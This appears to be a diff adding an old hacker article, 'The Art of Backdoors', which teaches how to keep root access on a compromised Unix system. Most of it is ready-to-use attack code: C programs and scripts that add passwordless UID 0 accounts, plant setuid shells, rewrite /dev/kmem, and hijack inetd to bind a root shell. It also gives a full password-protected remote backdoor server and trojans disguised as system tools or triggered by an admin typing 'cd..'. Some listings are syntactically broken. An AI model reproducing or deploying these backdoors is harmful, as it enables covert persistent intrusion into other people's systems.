@@ -1,0 +1,557 @@
+                             The Art of Backdoors
+                        =-=+=-=+=-=+=-=+=-=+=-=+=-=+=-=
+
+                                  By Meb
+                        (Meb_@Piratededucation.com)
+                      Http://TriadSecurity.sacone.com/
+
+This article is intended to teach you how to maintain root after you have
+gained it.  It is defenantly from the hackers perspective, but could also
+be viewed at by the Admins perspective, on how to detect these backdoors
+and remove them.  This article is not comprehensive, because their are so
+many ways to leave backdoors i could not possibly cover them all, but i'm
+sure it should explain certain methods and techniques for you to use.
+
+You've been trying to get into this box for a couple weeks, you've got
+your hands on a an acc but the privs are terrible.  The box is known well
+around too be very secure, but now you know just how good the admin is.
+You've tried everything, imap, nis, suid exploits, bad permissions, race
+conditions, but nothing is working.  Finally you stumble onto something
+which the admin overlooked and are quickly sitting on a root shell.  But
+what now? How do you keep this accomplishment you've worked so long on?
+
+[Basics]
+
+-1.
+
+You can add a UID 0 account to the passwd file.  This is not recommended
+because when the admin views the file, it will be increadably obvious that
+his box has been compromised, and you will probably lose your root
+position.  Here's a short c prog i wrote which will add a UID 0 acc to
+/etc/passwd.
+
+<++> backdoor/backdoor1.c
+#include
+
+main()
+{
+FILE *fd;
+fd=fopen("/etc/passwd","a+");
+fprintf(fd,"hax0r::0:0::/root:/bin/sh\n");
+}
+<-->
+
+In a similar attempt you could enable an abondoned account and change it's
+uid to 0 and change the * in the second field.  This method would obviosly
+be less obtrusive than the first
+
+Leave a suid shell in /tmp.  Once the file is run you will have root privs
+again, this is everyone favorite but many box's run cronjobs every couple
+hours or when they reboot to clean out tmp, also many box's don't allow
+suid files to be executed.  You can of course remove all these setbacks by
+editing /var/spool/cron/crontabs/root and /etc/fstab.  Here's a little
+program that makes a suid shell called out in /tmp.
+
+<++> backdoor/backdoor2.c
+#include
+main()
+{
+system("cp /bin/sh /tmp/out");
+system("chown root.root /tmp/out");
+system("chmod 4755 /tmp/out");
+}
+<-->
+
+[Intermediate]
+
+The super-server configuration file is not the first place a adminn will
+look, so obviosly is a good place to put a backdoor? But what makes these
+backdoors best, is that their remote, so you don't have to have a local
+account to regain root.  First, some background info: The Internet daemon
+(/etc/inetd) listens for connection requests on TCP and UDP ports and
+spawns the appropriate program (usally a server) when a connection request
+arrives. The format of the /etc/inetd.conf file is simple. Typical lines
+look like this:
+
+(1)     (2)     (3)     (4)     (5)     (6)             (7)
+ftp     stream  tcp     nowait  root    /usr/etc/ftpd   ftpd
+talk    dgram   udp     wait    root    /usr/etc/ntalkd ntalkd
+
+1: This is the daemon name of the servie that appears in /etc/services.
+This tells inetd what to look for in /etc/services to determine which port
+it should associate the program name with.
+
+2: This will tell inetd what type of connection to use when the session is
+establised . TCP uses streams, and UDP(The connectionless protocol) uses
+datagrams.
+
+3: Protocol field, TCP or UDP.
+
+4: This will tell inetd what the importance of the daemon is. A 'wait'
+flag indicates that the server will process a connection and make all
+subsequent connections wait. 'Nowait' means the server will accept a
+connection, spawn a child process to handle the connection, and then go
+back to sleep, waiting for further connections.
+
+5: Is the user the daemon is run as.
+
+6: Program to run when a connection arrives.
+
+7: is the actual command (and optional arguments). If the program is
+trivial (usally requiring no user interaction) inetd may handle it
+internally. This is done with an 'internal' flag in fields (6) and (7).
+So, to install a handy backdoor, choose a service that is not used often,
+and replace the daemon that would normally handle it with something else.
+You could make it spawn a program that adds a UID 0 acc, or creates a suid
+shell.
+
+To take over a service like daytime and instead of telling you the time it
+would drop you to a suid root shell, try something like this.
+
+Change the line in /etc/indetd.conf that looks like this:
+daytime stream  tcp     nowait  root    internal
+
+And change it to:
+daytime stream  tcp     nowait /bin/sh  sh -i.
+
+Now you've done this, so you decide to go test it out.  You try and it
+says "Unable to establish conection", whats wrong?  Well in order for
+these changes to take place you need to restart inetd, you could wait for
+the box to reboot, but who's patient? Just do a "killalll -9 inetd" and it
+will automatically restart itself.
+
+Another thing you could do was make a fake service and make it spawn a
+program which would be more secure, such as password protected, and have
+better options, so that you would have the power to modify the system
+further remotley without the dificulties of not running off of telnetd.
+Here is a program that will bind to any port and wait, it will not give a
+prompt, simply put in the password and you will be given a menu of
+options.  This code was written by theft shortly before he left the scene
+so it's might have a few bugs in it as well as some unworking functions.
+
+<++> backdoor/remoteback.c
+/* Coders:
+        Theft
+
+Help from:
+        Sector9, Halogen
+
+Greets: People: Liquid, AntiSocial, Peak, Grimknight, s0ttle,halogen,
+                Psionic, g0d, Psionic.
+        Groups: Ethical Mutiny Crew(EMC), Common Purpose hackers(CPH),
+                Global Hell(gH), Team Sploit, Hong Kong Danger Duo,
+                Tg0d, EHAP.
+Usage:
+        Setup:
+                # gcc -o backhore backhore.c    # ./backdoor password &
+        Run:
+                Telnet to the host on port 4000.  After connected you
+                Will not be prompted for a password, this way it is less
+                Obvious, just type the password and press enter, after this
+                You will be prompted for a command, pick 1-8.
+
+Distributers:
+        Ethical Mutiny Crew
+
+*/
+
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+
+#define PORT 4000
+#define MAXDATASIZE 100
+#define BACKLOG 10
+#define SA struct sockaddr  /* leaner meaner code */
+
+void handle(int);
+
+int
+main(int argc, char *argv[])
+{
+        int sockfd, new_fd, sin_size, numbytes, cmd;
+        char ask[10]="Command: ";
+        char *bytes, *buf, pass[40];
+        struct sockaddr_in my_addr;
+
+        struct sockaddr_in their_addr;
+
+        printf("\n      Backhore BETA by Theft\n");
+        printf(" 1: trojans rc.local\n");
+        printf(" 2: sends a systemwide message\n");
+        printf(" 3: binds a root shell on port 2000\n");
+        printf(" 4: creates suid sh in /tmp\n");
+        printf(" 5: creates mutiny account uid 0 no passwd\n");
+        printf(" 6: drops to suid shell\n");
+        printf(" 7: information on backhore\n");
+        printf(" 8: contact\n");
+
+        if (argc != 2) {
+                fprintf(stderr,"Usage: %s password\n", argv[0]);
+                exit(1);
+        }
+
+        strncpy(pass, argv[1], 40);
+        printf("..using password: %s..\n", pass);
+
+        if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
+                perror("socket");
+                exit(1);
+        }
+
+        my_addr.sin_family = AF_INET;
+        my_addr.sin_port = htons(PORT);
+        my_addr.sin_addr.s_addr = INADDR_ANY;
+
+        if (bind(sockfd, (SA *)&my_addr, sizeof(SA)) == -1) {
+
+                perror("bind");
+                exit(1);
+        }
+
+        if (listen(sockfd, BACKLOG) == -1) {
+                perror("listen");
+                exit(1);
+        }
+
+        sin_size = sizeof(SA);
+        while(1) {  /* main accept() loop */
+                if ((new_fd = accept(sockfd, (SA *)&their_addr, &sin_size)) == -1) {
+                        perror("accept");
+                        continue;
+                }
+                if (!fork()) {
+                        dup2(new_fd, 0);
+                        dup2(new_fd, 1);
+                        dup2(new_fd, 2);
+                        fgets(buf, 40, stdin);
+                        if (!strcmp(buf, pass)) {
+                                printf("%s", ask);
+                                cmd = getchar();
+                                handle(cmd);
+                        }
+                        close(new_fd);
+                        exit(0);
+                }
+                close(new_fd);
+                while(waitpid(-1,NULL,WNOHANG) > 0); /* rape the dying children */
+        }
+}
+
+void
+handle(int cmd)
+{
+        FILE *fd;
+
+        switch(cmd) {
+                case '1':
+                        printf("\nBackhore BETA by Theft\n");
+                        printf("theft@cyberspace.org\n");
+                        printf("Trojaning rc.local\n");
+                        fd = fopen("/etc/passwd", "a+");
+                        fprintf(fd, "mutiny::0:0:ethical mutiny crew:/root:/bin/sh");
+                        fclose(fd);
+                        printf("Trojan complete.\n");
+                        break;
+                case '2':
+                        printf("\nBackhore BETA by Theft\n");
+                        printf("theft@cyberspace.org\n");
+                        printf("Sending systemwide message..\n");
+                        system("wall Box owned via the Ethical Mutiny Crew");
+                        printf("Message sent.\n");
+                        break;
+                case '3':
+                        printf("\nBackhore BETA by Theft\n");
+                        printf("theft@cyberspace.org\n");
+                        printf("\nAdding inetd backdoor... (-p)\n");
+                        fd = fopen("/etc/services","a+");
+                        fprintf(fd,"backdoor\t2000/tcp\tbackdoor\n");
+                        fd = fopen("/etc/inetd.conf","a+");
+                        fprintf(fd,"backdoor\tstream\ttcp\tnowait\troot\t/bin/sh -i\n");
+                        execl("killall", "-HUP", "inetd", NULL);
+                        printf("\ndone.\n");
+                        printf("telnet to port 2000\n\n");
+                        break;
+                case '4':
+                        printf("\nBackhore BETA by Theft\n");
+                        printf("theft@cyberspace.org\n");
+                        printf("\nAdding Suid Shell... (-s)\n");
+                        system("cp /bin/sh /tmp/.sh");
+                        system("chmod 4700 /tmp/.sh");
+                        system("chown root:root /tmp/.sh");
+                        printf("\nSuid shell added.\n");
+                        printf("execute /tmp/.sh\n\n");
+                        break;
+                case '5':
+                        printf("\nBackhore BETA by Theft\n");
+                        printf("theft@cyberspace.org\n");
+                        printf("\nAdding root account... (-u)\n");
+                        fd=fopen("/etc/passwd","a+");
+                        fprintf(fd,"hax0r::0:0::/:/bin/bash\n");
+                        printf("\ndone.\n");
+                        printf("uid 0 and gid 0 account added\n\n");
+                        break;
+                case '6':
+                        printf("\nBackhore BETA by Theft\n");
+                        printf("theft@cyberspace.org\n");
+                        printf("Executing suid shell..\n");
+
+                        execl("/bin/sh");
+                        break;
+                case '7':
+                        printf("\nBackhore BETA by Theft\n");
+                        printf("theft@cyberspace.org\n");
+                        printf("\nInfo... (-i)\n");
+                        printf("\n3 - Adds entries to /etc/services & /etc/inetd.conf giving                    you\n");
+                        printf("a root shell on port 2000. example: telnet  2000\n\n");
+                        printf("4 - Creates a copy of /bin/sh to /tmp/.sh which, whenever\n");
+                        printf("executed gives you a root shell. example:/tmp/.sh\n\n");
+                        printf("5 - Adds an account with uid and gid 0 to the passwd file.\n");
+                        printf("The login is 'mutiny' and there is no passwd.");
+                        break;
+                case '8':
+                        printf("\nBackhore BETA by Theft\n");
+                        printf("\nhttp://theft.bored.org\n");
+                        printf("theft@cyberspace.org\n\n");
+                        break;
+                default:
+                        printf("unknown command: %d\n", cmd);
+                        break;
+        }
+}
+<-->
+
+[Advanced]
+
+Crontab is a very powerfull tool for the admin.  Cron is used to schedule
+jobs to do at certain times of the day, month, or year.  Can you see where
+this is going?  Because of this, you can make a very powerfull backdoor.
+With Cron you could make it spawn a program at say 3:00 am in the morning,
+when the admin is asleep, so you can quickly get in and do as you like and
+get out before he ever notices, it's possibilities are endless. The root
+crontab jobs are located in /var/spool/crontab/root and can be manually
+edited.  The Cron lines will look something like this.
+
+(1)     (2)     (3)     (4)     (5)     (6)
+ 0       0       *       *       3       /usr/bin/updatedb
+
+1. Minute  (0-60)
+2. Hour    (0-23)
+3. Day     (1-31)
+4. Month   (1-12)
+5. Day     (1-7)
+6. is the command (or shell script) to execute.
+
+The above shell script is executed on Wednesday. To create a backdoor in
+cron just add your custom line to /var/spool/crontab/root. You could make
+a program or shell script in the crontab which checked every week of so if
+the account we created earlier is still in the /etc/passwd.  To start
+this, you would add this line to /var/spool/crontab/root:
+
+0       0       *       *       *       /usr/bin/retract
+
+<++> backdoor/backdoor.sh
+#!/bin/csh
+# Is our account still alive in /etc/passwd? We'll see.
+
+set evilflag = (`grep eviluser /etc/passwd`)
+
+if($#evilflag == 0) then                        # Is he there?
+
+        set linecount = `wc -l /etc/passwd`
+        cd                                      # Do this at home.
+        cp /etc/passwd ./temppass               # Safety first.
+        @ linecount[1] /= 2
+        @ linecount[1] += 1                     # we only want 2 temp files
+        split -$linecount[1] ./temppass         # passwd string optional
+        echo "Meb::0:0:Meb:/root:/bin/sh" >> ./xaa
+        cat ./xab >> ./xaa
+        mv ./xaa /etc/passwd
+        chmod 644 /etc/passwd                   # or whatever it was beforehand
+        rm ./xa* ./temppass
+        echo Done...
+else
+endif
+<-->
+
+[Complex]
+
+You could of course write a trojan and place it in /bin and make the
+program create a suid shell if the right arguments are given.  This is a
+very good trojan if utilized correctly.  You could also replace a little
+used program with your trojan in /bin such as dialog to make your trojan
+even more stealth.  Here's a program which if given the correct agrument
+will create a suid shell in /tmp
+
+<++> backdoor/backdoor3.c
+#include
+#define pass "triad"
+#define BUFFERSIZE 6
+
+int main(argc, argv)
+int argc;
+char *argv[];{
+
+        int i=0;
+
+        if(argv[1]){
+
+                if(!(strcmp(pass,argv[1]))){
+
+
+                        system("cp /bin/csh /bin/.swp121");
+                        system("chmod 4755 /bin/.swp121");
+                        system("chown root /bin/.swp121");
+                        system("chmod 4755 /bin/.swp121");
+                }
+        }
+
+        printf("372f: Invalid control argument, unable to initialize. Retrying");
+        for(;i<10;i++){
+                fprintf(stderr,".");
+                sleep(1);
+        }
+        printf("\nAction aborted after 10 attempts.\n");
+        return(0);
+}
+<-->
+
+[Diverse]
+
+Because the kernel keeps it's paremeters in memory, it is possible for you
+too modify the memory and use it to change you proccess to the UID of 0.
+To do this, /dev/kmem must be world readable and writable.  The program
+below will seek to your page in the memory and change your UID effectively
+spawning you a suid root shell.
+
+<++> backdoor/kmemthief.c
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+
+#define pass "triad"
+
+struct user userpage;
+long address(), userlocation;
+
+int main(argc, argv, envp)
+int argc;
+char *argv[], *envp[];{
+
+        int count, fd;
+        long where, lseek();
+
+        if(argv[1]){
+                if(!(strcmp(pass,argv[1]))){
+                        fd=(open("/dev/kmem",O_RDWR);
+
+                        if(fd<0){
+                                printf("Cannot read or write to
+/dev/kmem\n");
+                                perror(argv);
+                                exit(10);
+                        }
+
+                        userlocation=address();
+                        where=(lseek(fd,userlocation,0);
+
+                        if(where!=userlocation){
+                                printf("Cannot seek to user page\n");
+                                perror(argv);
+                                exit(20);
+                        }
+
+                        count=read(fd,&userpage,sizeof(struct user));
+
+                        if(count!=sizeof(struct user)){
+                                printf("Cannot read user page\n");
+                                perror(argv);
+                                exit(30);
+                        }
+
+                        printf("Current UID: %d\n",userpage.u_ruid);
+                        printf("Current GID: %d\n",userpage.g_ruid);
+
+                        userpage.u_ruid=0;
+                        userpage.u_rgid=0;
+
+                        where=lseek(fd,userlocation,0);
+
+                        if(where!=userlocation){
+                                printf("Cannot seek to user page\n");
+                                perror(argv);
+                                exit(40);
+                        }
+
+                        write(fd,&userpage,((char *)&(userpage.u_procp))-((char *)&userpage));
+
+                        execle("/bin/csh","/bin/csh","-i",(char *)0, envp);
+                }
+        }
+
+}
+<-->
+
+[The Clumsy]
+
+Have you ever been pounding away working a problem with your box and
+accidently typed "cd.." instead of "cd .." It happens to me because before
+linux I used windows and MS-Dos for years, and the commands are still
+stuck in my head.  Well every now and then, the admin will type that,
+wouldn't you want to take advantage of his mistake? What if when he typed
+cd.. it would trigger your trojan program? Therefore being a semi remote
+backdoor seeing as you don't have to be logged in the box to trigger it,
+the truth is, you can!  Here's a small program I wrote to take advantage
+of human error.
+
+<++> backdoor/dumb.c
+/*
+This program will add a UID 0 account to /etc/passwd
+when the admin accidently types cd..
+Also to cover up itself it will perform the cd action
+so as the admin would never notice his mistake
+*/
+
+#include
+#include
+
+main()
+{
+FILE *fd;
+fd=fopen("/etc/passwd","a+");
+fprintf(fd,"hax0r::0:0::/root:/bin/sh\n");
+system("cd");
+}
+<-->
+
+Now compile that program and put it somewhere that it looks like it
+belongs.  It is also a good idea if you are doing this from a suid shell
+to change it's ownership by doing "chown root out" if the programs name
+was out, changing the group would also be a good idea, whats the reasoning
+behind this? Well if the admin deos a "ls -alF" and sees a suid root
+program which owner is an unprivileged account, he's going to figure out
+it's a backdoor and remove it.
+
+Ok, now that you've compiled the program(lets say it was called out in
+/bin) then you would do this command to "link" cd.. and /bin/out together,
+do a "ln cd.. /bin/out" and now when the admin makes that vital mistake,
+you'll have access to the system once again.
+
+[Closure]
+
+This article was meant to give you a feel for creating, maintaining, and
+using backdoors as well as removing them.  You may use this information
+any way you like, but be still use your judgement on how you use them and
+how much it will effect the system and it's performance. For any questions
+or comments, please send mail to meb_@piratededucation.com.
+
+
